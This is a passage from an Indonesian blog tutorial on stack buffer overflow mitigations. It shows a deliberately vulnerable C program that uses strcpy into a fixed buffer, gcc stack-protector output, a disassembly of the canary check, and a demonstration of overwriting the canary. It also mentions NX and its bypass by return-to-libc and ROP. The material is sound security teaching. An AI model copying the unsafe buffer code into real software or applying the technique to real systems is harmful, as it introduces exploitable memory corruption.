sayangnya nilai canaries tersebut selalu random.</p>
<p data-adtags-visited="true">Canaries dibuat oleh compiler, untuk 
mengaktifkan canaries gunakan opsi -fstack-protector untuk menonaktifkan
 gunakan opsi -fno-stack-protector. Dibawah ini adalah contoh program yg
 menggunaka canaries</p>
<div><div id="highlighter_875329" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ cat variable-overflow.c </code></div><div class="line number2 index1 alt1"><code class="plain plain">#include &lt;stdio.h&gt;</code></div><div class="line number3 index2 alt2"><code class="plain plain">#include &lt;string.h&gt;</code></div><div class="line number4 index3 alt1"><code class="plain plain">void vuln(char *zz){</code></div><div class="line number5 index4 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">char buf[24];</code></div><div class="line number6 index5 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">strcpy(buf,zz);</code></div><div class="line number7 index6 alt2"><code class="plain plain">}</code></div><div class="line number8 index7 alt1"><code class="plain plain">int main(int argc, char** argv){</code></div><div class="line number9 index8 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if(argc &gt; 1) vuln(argv[1]);</code></div><div class="line number10 index9 alt1"><code class="plain plain">}</code></div><div class="line number11 index10 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ gcc -fstack-protector -o bof3 variable-overflow.c</code></div><div class="line number12 index11 alt1"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ ./bof3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></div><div class="line number13 index12 alt2"><code class="plain plain">*** stack smashing detected ***: ./bof3 terminated</code></div><div class="line number14 index13 alt1"><code class="plain plain">Segmentation fault</code></div></div></td></tr></tbody></table></div></div>
<p class="inline-ad-slot" id="inline-ad-15" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Disini
 ada pesan error "*** stack smashing detected ***: ./bof3 terminated" 
pesan ini dihasilkan dari fungsi __stack_chk_fail() jika kita lihat 
hasil disassemblynya ada tambahan kode yg dilakukan oleh compiler untuk 
mengecek isi canaries</p>
<div><div id="highlighter_564709" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">Dump of assembler code for function vuln:</code></div><div class="line number2 index1 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x0000000000400566 &lt;+0&gt;: push&nbsp;&nbsp; rbp</code></div><div class="line number3 index2 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x0000000000400567 &lt;+1&gt;: mov&nbsp;&nbsp;&nbsp; rbp,rsp</code></div><div class="line number4 index3 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x000000000040056a &lt;+4&gt;: sub&nbsp;&nbsp;&nbsp; rsp,0x30</code></div><div class="line number5 index4 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x000000000040056e &lt;+8&gt;: mov&nbsp;&nbsp;&nbsp; QWORD PTR [rbp-0x28],rdi</code></div><div class="line number6 index5 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x0000000000400572 &lt;+12&gt;:&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; rax,QWORD PTR fs:0x28&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // nilai dari fs:0x28 disimpan ke rax</code></div><div class="line number7 index6 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x000000000040057b &lt;+21&gt;:&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; QWORD PTR [rbp-0x8],rax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // canaries berlokasi di [rbp-0x8] dan diisi dengan nilai yg dihasilkan dari fs:[[0x28]</code></div><div class="line number8 index7 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x000000000040057f &lt;+25&gt;:&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; eax,eax</code></div><div class="line number9 index8 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x0000000000400581 &lt;+27&gt;:&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; rdx,QWORD PTR [rbp-0x28]</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x0000000000400585 &lt;+31&gt;:&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp; rax,[rbp-0x20]</code></div><div class="line number11 index10 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x0000000000400589 &lt;+35&gt;:&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; rsi,rdx</code></div><div class="line number12 index11 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x000000000040058c &lt;+38&gt;:&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; rdi,rax</code></div><div class="line number13 index12 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x000000000040058f &lt;+41&gt;:&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x400450 &lt;strcpy@plt&gt;</code></div><div class="line number14 index13 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x0000000000400594 &lt;+46&gt;:&nbsp;&nbsp;&nbsp; nop</code></div><div class="line number15 index14 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x0000000000400595 &lt;+47&gt;:&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; rax,QWORD PTR [rbp-0x8]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // nilai dari canaries yg berada di [rbp:0x28] disimpan ke rax</code></div><div class="line number16 index15 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x0000000000400599 &lt;+51&gt;:&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; rax,QWORD PTR fs:0x28&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // program mengecek canaries, apakah sama dengan nilai fs:0x28,</code></div><div class="line number17 index16 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x00000000004005a2 &lt;+60&gt;:&nbsp;&nbsp;&nbsp; je&nbsp;&nbsp;&nbsp;&nbsp; 0x4005a9 &lt;vuln+67&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // jika tidak sama program memanggil fungsi __stack_chk_fail</code></div><div class="line number18 index17 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x00000000004005a4 &lt;+62&gt;:&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x400460 &lt;__stack_chk_fail@plt&gt; // dan menampilkan pesan "*** stack smashing detected ***: ./bof3 terminated"</code></div><div class="line number19 index18 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x00000000004005a9 &lt;+67&gt;:&nbsp;&nbsp;&nbsp; leave&nbsp; </code></div><div class="line number20 index19 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">0x00000000004005aa &lt;+68&gt;:&nbsp;&nbsp;&nbsp; ret&nbsp;&nbsp;&nbsp; </code></div><div class="line number21 index20 alt2"><code class="plain plain">End of assembler dump.</code></div></div></td></tr></tbody></table></div></div>
<p class="inline-ad-slot" id="inline-ad-16" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Liat diatas canaries disimpan di [rbp-0x8]<br>
Silahkan anda coba melihat nilai dari fs:0x28, nilai tersebut selalu 
random. Disini adalah contoh program yg menampilkan isi canaries. 
setelah fungsi strcpy dipanggil.</p>
<div><div id="highlighter_208174" class="syntaxhighlighter  cpp"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="cpp preprocessor">#include &lt;stdio.h&gt;</code></div><div class="line number2 index1 alt1"><code class="cpp preprocessor">#include &lt;string.h&gt;</code></div><div class="line number3 index2 alt2"><code class="cpp keyword bold">void</code> <code class="cpp plain">vuln(</code><code class="cpp color1 bold">char</code> <code class="cpp plain">*zz){</code></div><div class="line number4 index3 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">long</code> <code class="cpp plain">i;</code></div><div class="line number5 index4 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">char</code> <code class="cpp plain">buf[24];</code></div><div class="line number6 index5 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">strcpy</code><code class="cpp plain">(buf,zz);</code></div><div class="line number7 index6 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"Canaries nya : %p\n"</code><code class="cpp plain">, *(&amp;i+4));</code></div><div class="line number8 index7 alt1"><code class="cpp plain">}</code></div><div class="line number9 index8 alt2"><code class="cpp color1 bold">int</code> <code class="cpp plain">main(</code><code class="cpp color1 bold">int</code> <code class="cpp plain">argc, </code><code class="cpp color1 bold">char</code><code class="cpp plain">** argv){</code></div><div class="line number10 index9 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code><code class="cpp plain">(argc &gt; 1) vuln(argv[1]);</code></div><div class="line number11 index10 alt2"><code class="cpp plain">}</code></div></div></td></tr></tbody></table></div></div>
<p data-adtags-visited="true">Jarak variable i dan canaries adalah 32byte, untuk mendapatkan nilai canaries gunakan intruksi <code>*(&amp;amp;i+4)</code>, dimana 4 adalah jarak_canaries/sizeof(long). Sekarang coba kita jalankan</p>
<div><div id="highlighter_943734" class="syntaxhighlighter  plain"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ gcc -fstack-protector -o canaries canaries.c</code></div><div class="line number2 index1 alt1"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ ./canaries AAAAAAAAAAAaAAAAAAAAAAA</code></div><div class="line number3 index2 alt2"><code class="plain plain">Canaries nya : 0x593e71240dc69c00</code></div><div class="line number4 index3 alt1"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ ./canaries AAAAAAAAAAAaAAAAAAAAAAAA</code></div><div class="line number5 index4 alt2"><code class="plain plain">Canaries nya : 0x757277b2233c4100</code></div><div class="line number6 index5 alt1"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ ./canaries AAAAAAAAAAAaAAAAAAAAAAAAAAA</code></div><div class="line number7 index6 alt2"><code class="plain plain">Canaries nya : 0x272e416600414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 3byte canaries pertama, teroverwrite dengan 0x414141</code></div><div class="line number8 index7 alt1"><code class="plain plain">*** stack smashing detected ***: ./canaries terminated</code></div><div class="line number9 index8 alt2"><code class="plain plain">ramdhan@n0psledbyt3:~/artikel/simple-bof-1$ ./canaries AAAAAAAAAAAaAAAAAAAAAAAAAAAAAAAAAAAA</code></div><div class="line number10 index9 alt1"><code class="plain plain">Canaries nya : 0x4141414141414141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // canaries sudah teroverwrite dengan inputan kita</code></div><div class="line number11 index10 alt2"><code class="plain plain">*** stack smashing detected ***: ./canaries terminated</code></div><div class="line number12 index11 alt1"><code class="plain plain">Segmentation fault</code></div></div></td></tr></tbody></table></div></div>
<p class="inline-ad-slot" id="inline-ad-17" style="float:left;height:0px;margin:0 auto;overflow:hidden;width:740px;" data-adtags-width="740" data-adtags-visited="true"></p><p data-adtags-visited="true">Ketika canaries nilai nya berubah (teroverwrite) program langsung memanggil __stack_chk_fail()</p>
<h3>3. NX (No eXecute)</h3>
<p data-adtags-visited="true">Yang ketiga adalah NX, No Execute. NX 
adalah teknologi cpu yg membuat area yg berada suatu memori tidak bisa 
diexekusi, artinya code atau data yg berada dialamat yg mempunyai NX 
tidak bisa dieksekusi. Hal ini menyulitkan kita, jika shellcode yang 
kita punya hanya bisa ditaruh di area yg memiliki NXbit. Contohnya 
adalah area stack, di OS saat ini, area stack mempunyai NX, jadinya 
shellcode yg kita taruh di stack tidak bisa di execute. ketika kompilasi
 gcc otomatis akan memberikan NXbit pada stack. agar stack bisa 
dieksekusi tambahkan opsi “-z execstack” pada saat mengcompile</p>
<p data-adtags-visited="true">NX dapat di bypass dengan teknik yg 
dinamakan return-to-libc dan teknik ROP, kedua teknik ini akan kita 
bahas diartikel lain. Tapi untuk saat ini anda bisa membaca artikel 
[ini] (<a href="https://css.csail.mit.edu/6.858/2010/readings/return-to-libc.pdf" rel="nofollow">https://css.csail.mit.edu/6.858/2010/readings/return-to-libc.pdf</a> “return-to-libc”)</p>
<p data-adtags-visited="true">Mungkin sampai disini bahasan kita, bahasan selanjutnya insyaallah akan membahas tentang teknik ROP dan ret2libc.</p>
<h2>Referensi</h2>
<p data-adtags-visited="true">[1] <a href="http://phrack.org/issues/49/14.html" rel="nofollow">http://phrack.org/issues/49/14.html</a><br>
[3] <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow" rel="nofollow">https://en.wikipedia.org/wiki/Stack_buffer_overflow</a><br>
[3] <a href="https://docs.oracle.com/cd/E37670_01/E36387/html/ol_aslr_sec.html" rel="nofollow">https://docs.oracle.com/cd/E37670_01/E36387/html/ol_aslr_sec.html</a><br>
[4] <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" rel="nofollow">https://en.wikipedia.org/wiki/Address_space_layout_randomization</a><br>
[5] <a href="http://ezine.echo.or.id/ezine22/e22-008.txt" rel="nofollow">http://ezine.echo.or.id/ezine22/e22-008.txt</a><br>
[6] <a href="http://sarang.kecoak.or.id/TOKET_7/0x01-propolice_hacking.txt" rel="nofollow">http://sarang.kecoak.or.id/TOKET_7/0x01-propolice_hacking.txt</a><br>
[7] <a href="https://en.wikipedia.org/wiki/Buffer_overflow_protection" rel="nofollow">https://en.wikipedia.org/wiki/Buffer_overflow_protection</a></p>
<div id="atatags-370373-5ef352dab3bb2">
        <script type="text/javascript">
            __ATA.cmd.push(function() {
                __ATA.initVideoSlot('atatags-370373-5ef352dab3bb2', {
                    sectionId: '370373',
                    format: 'inread'
                });
            });
        </script>
    </div>			<div id="atatags-26942-5ef352dab3c5a" data-adtags-width="740"></div>
			
			<script>
				__ATA.cmd.push(function() {
					__ATA.initDynamicSlot({
						id: 'atatags-26942-5ef352dab3c5a',
						location: 120,
						formFactor: '001',
						label: {
							text: 'Advertisements',
						},
						creative: {
							reportAd: {
								text: 'Report this ad',
							},
							privacySettings: {
								text: 'Privacy settings',
							}
						}
					});
				});
			</script><div id="jp-post-flair" class="sharedaddy sd-like-enabled sd-sharing-enabled"><div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-79" class="share-twitter sd-button share-icon" href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/?share=twitter&amp;nb=1" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-79" class="share-facebook sd-button share-icon" href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/?share=facebook&amp;nb=1" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-end"></li></ul></div></div></div><div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-loaded" id="like-post-wrapper-131353854-79-5ef352dab4ebe" data-src="//widgets.wp.com/likes/index.html?ver=20190321#blog_id=131353854&amp;post_id=79&amp;origin=reversingpwn.wordpress.com&amp;obj_id=131353854-79-5ef352dab4ebe" data-name="like-post-frame-131353854-79-5ef352dab4ebe"><h3 class="sd-title">Like this:</h3><div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px; display: none;"><span class="button"><span>Like</span></span> <span class="loading">Loading...</span></div><iframe class="post-likes-widget jetpack-likes-widget" name="like-post-frame-131353854-79-5ef352dab4ebe" src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/index.html" width="100%" height="55px" frameborder="0"></iframe><span class="sd-text-color"></span><a class="sd-link-color"></a></div>
<div id="jp-relatedposts" class="jp-relatedposts" data-exclude="67" style="display: block;">
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
<div class="jp-relatedposts-items jp-relatedposts-items-minimal"><p class="jp-relatedposts-post jp-relatedposts-post0" data-post-id="93" data-post-format="false"><span class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://reversingpwn.wordpress.com/2017/07/29/93/" title="Return Oriented Programming Tutorial" data-origin="79" data-position="0">Return Oriented Programming Tutorial</a></span><span class="jp-relatedposts-post-context">In "pwn"</span></p><p class="jp-relatedposts-post jp-relatedposts-post1" data-post-id="248" data-post-format="false"><span class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://reversingpwn.wordpress.com/2017/12/27/format-string-attack-tutorial/" title="Format String Attack Tutorial" data-origin="79" data-position="1">Format String Attack Tutorial</a></span><span class="jp-relatedposts-post-context">In "pwn"</span></p><p class="jp-relatedposts-post jp-relatedposts-post2" data-post-id="149" data-post-format="false"><span class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://reversingpwn.wordpress.com/2017/09/01/writeup-cyber-jawara-2017/" title="Writeup Cyber Jawara 2017" data-origin="79" data-position="2">Writeup Cyber Jawara 2017</a></span><span class="jp-relatedposts-post-context">In "pwn"</span></p></div></div></div>	</div><!-- .entry-content -->

	<div class="entry-footer">
			</div><!-- .entry-footer -->

	<div class="entry-author-wrapper">
			<div class="entry-author author-avatar-show">
				<div class="author-avatar">
			<img alt="" src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/d7ea009529d9c8db6cf12c108b7b486a_003.jpeg" class="avatar avatar-80 grav-hashed grav-hijack" id="grav-d7ea009529d9c8db6cf12c108b7b486a-1" width="80" height="80">		</div><!-- .author-avatar -->
		
		<div class="author-heading">
			<h2 class="author-title">Published by <span class="author-name">n0psledbyte</span></h2>
		</div><!-- .author-heading -->

		<p class="author-bio">
						<a class="author-link" href="https://reversingpwn.wordpress.com/author/n0psledbyte/" rel="author">
				View all posts by n0psledbyte			</a>
		</p><!-- .author-bio -->
	</div><!-- .entry-auhtor -->
		<div class="site-posted-on">
			<strong>Published</strong>
			<time class="entry-date published" datetime="2017-07-08T15:38:19+07:00">July 8, 2017</time><time class="updated" datetime="2017-07-12T08:10:44+07:00">July 12, 2017</time>		</div><!-- .site-posted-on -->
	</div>
</article><!-- #post-## -->

			
	<nav class="navigation post-navigation" role="navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-i/" rel="prev"><span class="meta-nav screen-reader-text">Previous Post</span> Stack Buffer Overflow : Part&nbsp;I</a></div><div class="nav-next"><a href="https://reversingpwn.wordpress.com/2017/07/29/93/" rel="next"><span class="meta-nav screen-reader-text">Next Post</span> Return Oriented Programming&nbsp;Tutorial</a></div></div>
	</nav>
			
<div id="comments" class="comments-area">

	
			<h2 class="comments-title">
			3 thoughts on “<span>Stack Buffer Overflow : Part&nbsp;II</span>”		</h2><!-- .comments-title -->

		
		<ol class="comment-list">
					<li id="comment-13" class="comment byuser comment-author-stnmrshx even thread-even depth-1 parent highlander-comment" data-adtags-visited="true">
			<article id="div-comment-13" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt="" src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/7ff68b740876b0714f63b642add6cdd2.jpeg" class="avatar avatar-48 grav-hashed grav-hijack" id="grav-7ff68b740876b0714f63b642add6cdd2-0" width="48" height="48">						<b class="fn"><a href="http://gravatar.com/stnmrshx" rel="external nofollow ugc" class="url">stnmrshx</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/#comment-13">
							<time datetime="2018-02-25T14:46:02+07:00">
								February 25, 2018 at 2:46 pm							</time>
						</a>
											</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Mantep beb, keren \o/</p>
<p id="comment-like-13" data-liked="comment-not-liked" class="comment-likes comment-not-liked"><a href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/?like_comment=13&amp;_wpnonce=37b2db6a3f" class="comment-like-link needs-login" rel="nofollow" data-blog="131353854"><span>Like</span></a><span id="comment-like-count-13" class="comment-like-feedback">Like</span></p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel="nofollow" class="comment-reply-link" href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/?replytocom=13#respond" data-commentid="13" data-postid="79" data-belowelement="div-comment-13" data-respondelement="respond" aria-label="Reply to stnmrshx">Reply</a></div>			</article><!-- .comment-body -->
		<ol class="children">
		<li id="comment-14" class="comment byuser comment-author-n0psledbyte bypostauthor odd alt depth-2 highlander-comment">
			<article id="div-comment-14" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt="" src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/d7ea009529d9c8db6cf12c108b7b486a_002.jpeg" class="avatar avatar-48 grav-hashed grav-hijack" id="grav-d7ea009529d9c8db6cf12c108b7b486a-2" width="48" height="48">						<b class="fn"><a href="https://reversingpwn.wordpress.com/" rel="external nofollow ugc" class="url">n0psledbyte</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/#comment-14">
							<time datetime="2018-02-25T14:48:55+07:00">
								February 25, 2018 at 2:48 pm							</time>
						</a>
											</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Ampun mastah _/\_</p>
<p id="comment-like-14" data-liked="comment-not-liked" class="comment-likes comment-not-liked"><a href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/?like_comment=14&amp;_wpnonce=56cdabd0bf" class="comment-like-link needs-login" rel="nofollow" data-blog="131353854"><span>Like</span></a><span id="comment-like-count-14" class="comment-like-feedback">Like</span></p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel="nofollow" class="comment-reply-link" href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/?replytocom=14#respond" data-commentid="14" data-postid="79" data-belowelement="div-comment-14" data-respondelement="respond" aria-label="Reply to n0psledbyte">Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-284" class="comment even thread-odd thread-alt depth-1 highlander-comment" data-adtags-visited="true">
			<article id="div-comment-284" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt="" src="Stack%20Buffer%20Overflow%20%20%20Part%20II%20%E2%80%93%20Reversing%20and%20Pwning_files/bdf703ca189c88e9dbfdbeceb143f583.png" class="avatar avatar-48 grav-hashed grav-hijack" id="grav-bdf703ca189c88e9dbfdbeceb143f583-0" width="48" height="48">						<b class="fn"><a href="http://phanatagama.github.io/" rel="external nofollow ugc" class="url">Cl4yzer0</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/#comment-284">
							<time datetime="2020-05-23T08:33:55+07:00">
								May 23, 2020 at 8:33 am							</time>
						</a>
											</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Yang bagian shellcode, dikasih tau program alamat buffernya 
0xffffd30c. Misal gak dikasih tau gimana cara mencarinya? Apakah alamat 
buffer yg dimaksud merupakan alamat pada stack tempat inputan pertama 
kali diletakkan?</p>
<p id="comment-like-284" data-liked="comment-not-liked" class="comment-likes comment-not-liked"><a href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/?like_comment=284&amp;_wpnonce=2e4a901ed0" class="comment-like-link needs-login" rel="nofollow" data-blog="131353854"><span>Like</span></a><span id="comment-like-count-284" class="comment-like-feedback">Like</span></p>
				</div><!-- .comment-content -->

				<div class="reply"><a rel="nofollow" class="comment-reply-link" href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/?replytocom=284#respond" data-commentid="284" data-postid="79" data-belowelement="div-comment-284" data-respondelement="respond" aria-label="Reply to Cl4yzer0">Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
		</ol><!-- .comment-list -->

		
	
	
		<div id="respond" class="comment-respond js">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="https://reversingpwn.wordpress.com/2017/07/08/stack-buffer-overflow-part-ii/?relatedposts_hit=1&amp;relatedposts_origin=67&amp;relatedposts_position=0#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://reversingpwn.wordpress.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate=""><input type="hidden" id="highlander_comment_nonce" name="highlander_comment_nonce" value="217d17e2b1"><input type="hidden" name="_wp_http_referer" value="/2017/07/08/stack-buffer-overflow-part-ii/?relatedposts_hit=1&amp;relatedposts_origin=67&amp;relatedposts_position=0">
<input type="hidden" name="hc_post_as" id="hc_post_as" value="guest">

<div class="comment-form-field comment-textarea">
	
